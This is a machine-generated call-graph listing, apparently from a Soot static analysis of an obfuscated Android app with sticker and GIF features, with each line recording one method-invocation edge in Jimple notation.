INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Collection: java.lang.Object[] toArray()>() in <izw: java.lang.Object[] S(java.lang.Iterable)> ==> <java.util.AbstractCollection: java.lang.Object[] toArray()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(15) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>(r0, $l4, $l5, $l3) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lsc: lsw a(java.util.logging.Level)>($r2) in <lsc: lsw d()> ==> <lsh: lsw a(java.util.logging.Level)>
VIRTUAL edge: virtualinvoke r0.<j$.util.concurrent.q: j$.util.concurrent.l c()>() in <j$.util.concurrent.d: java.lang.Object next()> ==> <j$.util.concurrent.q: j$.util.concurrent.l c()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(11) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
VIRTUAL edge: $r4 = virtualinvoke $r3.<lma: lsa l()>() in <llg: void <init>(llo)> ==> <lqn: lsa l()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
STATIC edge: $i5 = staticinvoke <izw: int ah(int)>($i4) in <ljf: boolean add(java.lang.Object)> ==> <izw: int ah(int)>
STATIC edge: $r0 = staticinvoke <lsz: lsz c(java.lang.String,java.lang.Class)>("ratelimit_count", class "Ljava/lang/Integer;") in <lsl: void <clinit>()> ==> <lsz: lsz c(java.lang.String,java.lang.Class)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <jlu: void <init>(int)> ==> <java.lang.Object: void <init>()>
STATIC edge: $z0 = staticinvoke <ivw: boolean B(java.lang.String)>($r2) in <ivv: void f(java.lang.String)> ==> <ivw: boolean B(java.lang.String)>
VIRTUAL edge: $c1 = virtualinvoke $r1.<java.lang.String: char charAt(int)>(0) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.String: char charAt(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lka: void <init>()> ==> <java.lang.Object: void <init>()>
STATIC edge: $r1 = staticinvoke <java.util.Arrays: int[] copyOf(int[],int)>($r1, $i0) in <ljf: void l(int)> ==> <java.util.Arrays: int[] copyOf(int[],int)>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
SPECIAL edge: $i0 = specialinvoke r0.<qj: int j()>() in <qj: int b(java.lang.Object)> ==> <qj: int j()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lsm: int a(lsz)> ==> <lta: boolean equals(java.lang.Object)>
VIRTUAL edge: $c2 = virtualinvoke $r0.<java.lang.String: char charAt(int)>($i0) in <ivw: boolean B(java.lang.String)> ==> <java.lang.String: char charAt(int)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(18) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
STATIC edge: $i2 = staticinvoke <lma: int e(int)>($i1) in <lma: lma i(int,java.lang.Object[])> ==> <lma: int e(int)>
INTERFACE edge: $z0 = interfaceinvoke $r3.<java.util.List: boolean isEmpty()>() in <ivv: ivw a()> ==> <java.util.ArrayList: boolean isEmpty()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String replace(char,char)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $i0 = staticinvoke <lma: int e(int)>($i0) in <lly: lma g()> ==> <lma: int e(int)>
STATIC edge: $r0 = staticinvoke <iye: lfa p(lfa)>($r1) in <hfd: void <clinit>()> ==> <iye: lfa p(lfa)>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljf: boolean m()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: boolean m()>
SPECIAL edge: specialinvoke $r13.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null throw statement replaced by Soot") in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
SPECIAL edge: $r3 = specialinvoke r0.<lvr: java.util.Map$Entry d(java.lang.String,int)>($r8, $i0) in <lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])> ==> <lvr: java.util.Map$Entry d(java.lang.String,int)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalStateException: void <init>(java.lang.String)>($r4) in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.IllegalStateException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lkf: void <init>()>() in <lqk: void <init>()> ==> <lkf: void <init>()>
VIRTUAL edge: $r5 = virtualinvoke $r4.<qj: java.lang.Object put(java.lang.Object,java.lang.Object)>($r2, $r3) in <ivv: ivw i(java.lang.String)> ==> <qj: java.lang.Object put(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <iec: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r3 = virtualinvoke $r1.<ljd: java.lang.Object k(int)>($i0) in <ljb: java.lang.Object getValue()> ==> <ljd: java.lang.Object k(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.p: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: staticinvoke <izw: void an(java.lang.Object,int,int)>($r1, $i5, $i1) in <ljf: int o(int,int,int,int)> ==> <izw: void an(java.lang.Object,int,int)>
INTERFACE edge: $z0 = interfaceinvoke $r2.<java.util.List: boolean isEmpty()>() in <ivv: int h()> ==> <java.util.ArrayList: boolean isEmpty()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <jhe: void <init>(lak,lsr,int,byte[])> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke r0.<lwe: void <init>()>() in <lwa: void <init>()> ==> <lwe: void <init>()>
STATIC edge: $i8 = staticinvoke <izw: int af(int,int)>($i2, $i4) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int af(int,int)>
CLINIT edge: staticinvoke <java.lang.Boolean: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Boolean: void <clinit>()>
STATIC edge: $i8 = staticinvoke <izw: int aj(java.lang.Object,int)>($r1, $i3) in <ljf: int o(int,int,int,int)> ==> <izw: int aj(java.lang.Object,int)>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.util.ArrayList: void <init>()>() in <ivv: void <init>()> ==> <java.util.ArrayList: void <init>()>
VIRTUAL edge: $r6 = virtualinvoke $r7.<lsq: java.lang.String b()>() in <lsc: void f(java.lang.String,ltn)> ==> <lsp: java.lang.String b()>
INTERFACE edge: $r1 = interfaceinvoke $r2.<java.util.Set: java.lang.Object[] toArray()>() in <ljf: java.lang.Object[] toArray()> ==> <java.util.AbstractCollection: java.lang.Object[] toArray()>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c1) in <ivw: boolean F(java.lang.String)> ==> <ivw: boolean u(char)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<qj: java.lang.Object get(java.lang.Object)>($r0) in <ivw: ivw g(java.lang.String)> ==> <qj: java.lang.Object get(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
INTERFACE edge: $r1 = interfaceinvoke $r0.<java.util.Set: java.util.Iterator iterator()>() in <lri: int b(java.util.Set)> ==> <lqs: java.util.Iterator iterator()>
STATIC edge: $i1 = staticinvoke <lwk: int c(java.lang.StackTraceElement[],java.lang.Class,int)>($r2, $r1, 3) in <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <lwk: int c(java.lang.StackTraceElement[],java.lang.Class,int)>
SPECIAL edge: specialinvoke $r13.<lvq: void <init>(lvr,int)>(r0, $i1) in <lvr: void <init>(lvr,lvr)> ==> <lvq: void <init>(lvr,int)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r10) in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
STATIC edge: $i8 = staticinvoke <izw: int ac(int)>($i6) in <lma: lma i(int,java.lang.Object[])> ==> <izw: int ac(int)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("Missing subtags to form a valid language tag") in <ivv: int h()> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean z(java.lang.String)>($r4) in <ivw: ivw d(java.util.Locale)> ==> <ivw: boolean z(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<ivw: java.lang.String p()>() in <ivw: int hashCode()> ==> <ivw: java.lang.String p()>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r2, $r1) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.util.HashMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r12 = virtualinvoke $r7.<lts: java.lang.Object e(int)>($i1) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object e(int)>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(1) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: $r3 = specialinvoke r0.<ljf: int[] r()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: int[] r()>
SPECIAL edge: specialinvoke $r3.<lvr: void <init>(java.util.List)>($r0) in <lvt: void <clinit>()> ==> <lvr: void <init>(java.util.List)>
STATIC edge: $z0 = staticinvoke <ivw: boolean F(java.lang.String)>($r6) in <ivw: ivw d(java.util.Locale)> ==> <ivw: boolean F(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <iej: void <clinit>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
STATIC edge: $z0 = staticinvoke <ivw: boolean v(java.lang.String)>($r0) in <ivw: boolean F(java.lang.String)> ==> <ivw: boolean v(java.lang.String)>
SPECIAL edge: specialinvoke $r5.<java.lang.StringBuilder: void <init>()>() in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: void <init>()>
INTERFACE edge: interfaceinvoke $r2.<java.util.List: void clear()>() in <ivv: ivw b(java.lang.String)> ==> <java.util.ArrayList: void clear()>
STATIC edge: $z0 = staticinvoke <java.lang.reflect.Modifier: boolean isStatic(int)>($i2) in <j$.sun.misc.b: java.lang.reflect.Field i()> ==> <java.lang.reflect.Modifier: boolean isStatic(int)>
STATIC edge: $l2 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: long e(long)>($l2) in <j$.util.concurrent.ThreadLocalRandom: void c()> ==> <j$.util.concurrent.ThreadLocalRandom: long e(long)>
STATIC edge: $r1 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r1, $i0) in <ljf: java.lang.Object[] toArray()> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
CLINIT edge: staticinvoke <ljd: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ljd: void <clinit>()>
VIRTUAL edge: $r26 = virtualinvoke $r25.<java.lang.Class: java.lang.reflect.Method getDeclaredMethod(java.lang.String,java.lang.Class[])>("addSuppressed", $r24) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.Class: java.lang.reflect.Method getDeclaredMethod(java.lang.String,java.lang.Class[])>
SPECIAL edge: specialinvoke $r1.<java.lang.StringBuilder: void <init>()>() in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <lta: int hashCode()>
STATIC edge: $r5 = staticinvoke <lma: lma i(int,java.lang.Object[])>(5, $r4) in <lma: lma v(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)> ==> <lma: lma i(int,java.lang.Object[])>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(double[],double[])>($r16, $r17) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(double[],double[])>
VIRTUAL edge: $r12 = virtualinvoke $r11.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>($r1) in <lsd: boolean b(lsr)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>
SPECIAL edge: specialinvoke $r5.<j$.util.concurrent.p: void <init>()>() in <j$.util.concurrent.q: j$.util.concurrent.l c()> ==> <j$.util.concurrent.p: void <init>()>
VIRTUAL edge: $r3 = virtualinvoke $r1.<java.lang.String: char[] toCharArray()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.String: char[] toCharArray()>
STATIC edge: $r4 = staticinvoke <lma: lma r(java.lang.Object)>($r1) in <lma: lma i(int,java.lang.Object[])> ==> <lma: lma r(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<lsg: void <init>()>() in <lsh: void <clinit>()> ==> <lsg: void <init>()>
SPECIAL edge: specialinvoke $r12.<mag: void <init>(java.lang.String,int,int)>("EXPRESSIVE_STICKER_IMAGE", 12, 12) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke r0.<lsv: void <init>()>() in <lte: void <init>()> ==> <lsv: void <init>()>
STATIC edge: $r4 = staticinvoke <lqq: java.lang.Object u(java.lang.Object[],int,int,int)>($r0, $i0, $i1, 0) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <lqq: java.lang.Object u(java.lang.Object[],int,int,int)>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r2, "log site key") in <lta: void <init>(lsr,java.lang.Object)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
STATIC edge: $z0 = staticinvoke <ojg: boolean f(java.lang.Object,java.lang.Object)>($r1, $r4) in <qj: int i(java.lang.Object,int)> ==> <ojg: boolean f(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lid: java.lang.Object getValue()>() in <lid: boolean equals(java.lang.Object)> ==> <lki: java.lang.Object getValue()>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <ivv: void <init>()> ==> <java.lang.Object: void <init>()>
INTERFACE edge: $r3 = interfaceinvoke $r1.<java.util.Map$Entry: java.lang.Object getValue()>() in <lli: void c(java.util.Map$Entry)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
STATIC edge: $r12 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r12) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r24.<lss: void <init>(java.lang.Throwable,ltc,java.lang.StackTraceElement[])>($r21, $r6, $r22) in <lsd: boolean b(lsr)> ==> <lss: void <init>(java.lang.Throwable,ltc,java.lang.StackTraceElement[])>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r1) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<lfb: void <init>(lfa)>($r0) in <iye: lfa p(lfa)> ==> <lfb: void <init>(lfa)>
SPECIAL edge: specialinvoke $r6.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw a()> ==> <java.lang.StringBuilder: void <init>()>
SPECIAL edge: specialinvoke $r2.<hns: void <init>()>() in <hnt: void <clinit>()> ==> <hns: void <init>()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Enum: int ordinal()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r0) in <ivw: ivw g(java.lang.String)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
SPECIAL edge: specialinvoke r0.<java.lang.RuntimeException: void <init>()>() in <java.lang.NullPointerException: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>()>
CLINIT edge: staticinvoke <ldr: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ldr: void <clinit>()>
INTERFACE edge: $r6 = interfaceinvoke $r9.<java.util.Map$Entry: java.lang.Object getKey()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.k: java.lang.Object getKey()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(5) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lma: lkq f()>() in <lma: lkq k()> ==> <lqn: lkq f()>
SPECIAL edge: specialinvoke r0.<lim: void <init>()>() in <llo: void <init>(lkx,int)> ==> <lim: void <init>()>
STATIC edge: $r8 = staticinvoke <ivw: ivw d(java.util.Locale)>($r9) in <ivw: void <clinit>()> ==> <ivw: ivw d(java.util.Locale)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r1) in <ivv: ivw b(java.lang.String)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <java.lang.String: int hashCode()>
SPECIAL edge: specialinvoke r0.<java.util.AbstractMap: void <init>()>() in <j$.util.concurrent.ConcurrentHashMap: void <init>()> ==> <java.util.AbstractMap: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <ojg: boolean f(java.lang.Object,java.lang.Object)> ==> <ivw: boolean equals(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean w(char[],int,int)>($r4, $i4, $i5) in <nzh: boolean f(ivv)> ==> <ivw: boolean w(char[],int,int)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.Map$Entry: java.lang.Object getKey()>() in <llg: java.lang.Object next()> ==> <lki: java.lang.Object getKey()>
SPECIAL edge: specialinvoke r0.<qj: void <init>(int)>(0) in <qj: void <init>()> ==> <qj: void <init>(int)>
STATIC edge: $i0 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: int n(int)> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
VIRTUAL edge: $r5 = virtualinvoke $r2.<lts: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object d(lsz)>
SPECIAL edge: specialinvoke $r1.<mag: void <init>(java.lang.String,int,int)>("STICKER_JSON", 1, 1) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.String: boolean isEmpty()>() in <ivv: ivw i(java.lang.String)> ==> <java.lang.String: boolean isEmpty()>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("Unrecognized language tag") in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("ExpressiveStickerMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: $r3 = virtualinvoke $r4.<ltc: java.lang.String toString()>() in <lss: void <init>(java.lang.Throwable,ltc,java.lang.StackTraceElement[])> ==> <java.lang.Enum: java.lang.String toString()>
VIRTUAL edge: $r6 = virtualinvoke $r7.<lsq: java.lang.String d()>() in <lsc: void f(java.lang.String,ltn)> ==> <lsp: java.lang.String d()>
SPECIAL edge: specialinvoke $r0.<java.util.concurrent.atomic.AtomicReference: void <init>()>() in <bel: void <clinit>()> ==> <java.util.concurrent.atomic.AtomicReference: void <init>()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.AssertionError: void <init>(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r1, 0, $r2, $i1, $i0) in <lql: int b(java.lang.Object[],int)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
INTERFACE edge: $r8 = interfaceinvoke $r7.<java.util.Set: java.util.Iterator iterator()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.e: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lwc: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke $r3.<java.lang.String: java.lang.String concat(java.lang.String)>($r1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r2, $i2, $r12) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
SPECIAL edge: specialinvoke $r2.<mag: void <init>(java.lang.String,int,int)>("GIS_GIF_METADATA", 2, 2) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
STATIC edge: $i5 = staticinvoke <izw: int ah(int)>($i4) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int ah(int)>
CLINIT edge: staticinvoke <jsg: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <jsg: void <clinit>()>
STATIC edge: $r28 = staticinvoke <java.lang.Long: java.lang.Long valueOf(java.lang.String)>($r12) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.Long: java.lang.Long valueOf(java.lang.String)>
VIRTUAL edge: $l1 = virtualinvoke $r3.<j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>(class "Lj$/util/concurrent/ConcurrentHashMap;", "sizeCtl") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>
STATIC edge: $i3 = staticinvoke <izw: int ad(java.lang.Object)>($r1) in <ljf: boolean add(java.lang.Object)> ==> <izw: int ad(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>("rnd", $r1) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>
VIRTUAL edge: $r8 = virtualinvoke $r7.<lsc: lsw d()>() in <ivw: ivw d(java.util.Locale)> ==> <lsc: lsw d()>
VIRTUAL edge: $i1 = virtualinvoke r0.<lkq: int size()>() in <lkq: lsb C(int)> ==> <lqp: int size()>
VIRTUAL edge: $i4 = virtualinvoke r0.<ljd: int e()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: int e()>
SPECIAL edge: specialinvoke $r1.<lpi: void <init>(java.lang.String,int)>("VALUE", 1) in <lpi: void <clinit>()> ==> <lpi: void <init>(java.lang.String,int)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(14) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: $i1 = specialinvoke r0.<ivv: int h()>() in <ivv: ivw a()> ==> <ivv: int h()>
STATIC edge: $z0 = staticinvoke <ivw: boolean A(char)>($c0) in <ivw: boolean y(char)> ==> <ivw: boolean A(char)>
VIRTUAL edge: $i0 = virtualinvoke $r4.<lma: int size()>() in <lly: lma g()> ==> <lrg: int size()>
VIRTUAL edge: $i0 = virtualinvoke r0.<lvq: int b()>() in <lvq: java.lang.Object c(int)> ==> <lvq: int b()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.k: void <init>(java.lang.Object,java.lang.Object,j$.util.concurrent.ConcurrentHashMap)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r0 = virtualinvoke $r2.<java.lang.Class: java.lang.reflect.Field getDeclaredField(java.lang.String)>("theUnsafe") in <j$.sun.misc.b: java.lang.reflect.Field i()> ==> <java.lang.Class: java.lang.reflect.Field getDeclaredField(java.lang.String)>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.Map$Entry: java.lang.Object getValue()>() in <llg: java.lang.Object next()> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
VIRTUAL edge: $r5 = virtualinvoke $r2.<lts: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <ltr: java.lang.Object d(lsz)>
SPECIAL edge: $i2 = specialinvoke r0.<lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])>($r7, $i3, $i2, $r4, $r5) in <lvr: void <init>(lvr,lvr)> ==> <lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])>
INTERFACE edge: interfaceinvoke $r10.<java.util.List: boolean add(java.lang.Object)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <java.util.ArrayList: boolean add(java.lang.Object)>
STATIC edge: $r2 = staticinvoke <her: her k(miy)>($r1) in <her: void <clinit>()> ==> <her: her k(miy)>
VIRTUAL edge: $r0 = virtualinvoke $r1.<java.lang.ThreadLocal: java.lang.Object get()>() in <j$.util.concurrent.ThreadLocalRandom: int a(int)> ==> <java.lang.ThreadLocal: java.lang.Object get()>
SPECIAL edge: specialinvoke $r0.<gwk: void <init>()>() in <gwk: void <clinit>()> ==> <gwk: void <init>()>
